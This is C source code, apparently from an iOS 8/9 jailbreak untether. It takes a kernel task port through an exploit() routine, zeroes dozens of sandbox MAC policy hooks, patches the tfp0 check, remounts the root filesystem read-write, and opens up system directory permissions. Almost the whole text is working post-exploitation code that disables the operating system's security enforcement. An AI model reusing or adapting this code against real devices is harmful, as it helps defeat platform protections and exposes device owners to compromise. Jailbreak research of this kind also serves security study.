    *(uint32_t*)(pangu9_payload+0x82) = sb_evaluate_val;
    *(uint32_t*)(pangu9_payload+0x86) = back_sb_evaluate;
    
    void* sandbox_payload = malloc(payload_len);
    memcpy(sandbox_payload, pangu9_payload, payload_len);
    
    if (strstr(u.version, "3248.1")) { // 9.0-9.1
        // hook sb_evaluate
        printf("[*] sb_evaluate\n");
        patch_page_table(tte_virt, tte_phys, ((kbase + payload_base) & ~0xFFF));
        copyout((kbase + payload_base), sandbox_payload, payload_len);
        printf("[*] sb_evaluate_hook\n");
        uint32_t sb_evaluate_hook = make_b_w((sb_patch-kbase), payload_base);
        wk32_exec(sb_patch, sb_evaluate_hook);
    } else { // 9.2-9.3.4
        uint32_t sbopsoffset = kbase + find_sbops(kbase, kdata, ksize);
        printf("nuking sandbox\n");
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0);
        wk32_exec(sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0);
    }

    printf("[*] patch tfp0\n");
    uint32_t tfp0_patch = kbase + find_tfp0_patch(kbase, kdata, ksize);
    printf("[PF] tfp0_patch: %08x\n", tfp0_patch);
    patch_page_table(tte_virt, tte_phys, (tfp0_patch & ~0xFFF));
    wk32(tfp0_patch, 0xbf00bf00);

    printf("enable patched.\n");
}

void jailbreak_init(void) {
    uname(&u);
    printf("kern.version: %s\n", u.version);

    if (strstr(u.version, "3248") || strstr(u.version, "3247")) {
        printf("isIOS9? yes\n");
        isIOS9 = true;
    }

    if (strstr(u.version, "S5L894")) {
        printf("isA5? yes\n");
        isA5 = true;
    }
}

#ifdef UNTETHER
void load_jb(void){
    // remount rootfs
    printf("[*] remounting rootfs\n");
    char* nmr = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
    printf("remount = %d\n",mntr);
    
    const char *jl;
    pid_t pd = 0;
    
    int f = open("/.installed_daibutsu", O_RDONLY);
    if (f == -1) {
        chmod("/private", 0777);
        chmod("/private/var", 0777);
        chmod("/private/var/mobile", 0777);
        chmod("/private/var/mobile/Library", 0777);
        chmod("/private/var/mobile/Library/Preferences", 0777);
        
        posix_spawn(&pd, "/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", 0, 0, (char**)&(const char*[]){"/var/lib/dpkg/info/com.saurik.patcyh.extrainst_", "install", NULL}, NULL);
        printf("[*] pid = %x\n", pd);
        waitpid(pd, 0, 0);
        sleep(3);
        
        open("/.installed_daibutsu", O_RDWR|O_CREAT);
        chmod("/.installed_daibutsu", 0644);
        chown("/.installed_daibutsu", 0, 0);
    }
    
    printf("[*] loading JB\n");
    // substrate: run "dirhelper"
    jl = "/bin/bash";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "/usr/libexec/dirhelper", NULL }, NULL);
    waitpid(pd, NULL, 0);
    
    usleep(10000);
    
    // looks like this doesnt work with jsc untether, will use daemonloader instead, launched by dirhelper above
    jl = "/bin/launchctl";
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/LaunchDaemons", NULL }, NULL);
    posix_spawn(&pd, jl, NULL, NULL, (char **)&(const char*[]){ jl, "load", "/Library/NanoLaunchDaemons", NULL }, NULL);
    
    usleep(10000);
}

void failed(void){
    printf("[-] failed to execute untether. rebooting.\n");
    reboot(0);
}

int main(void){
    jailbreak_init();

    uint32_t kernel_base;
    tfp0 = exploit(&kernel_base, isIOS9);
    
    if(tfp0){
        printf("[*] got tfp0: %x\n", tfp0);

        if(!isIOS9){
            unjail8(kernel_base);
        } else {
            unjail9(kernel_base);
        }
        load_jb();
        
    } else {
        printf("[-] Failed to get tfp0\n");
        failed();
        return -1;
    }
    
    printf("[*] DONE!\n");

    return 0;
}
#endif
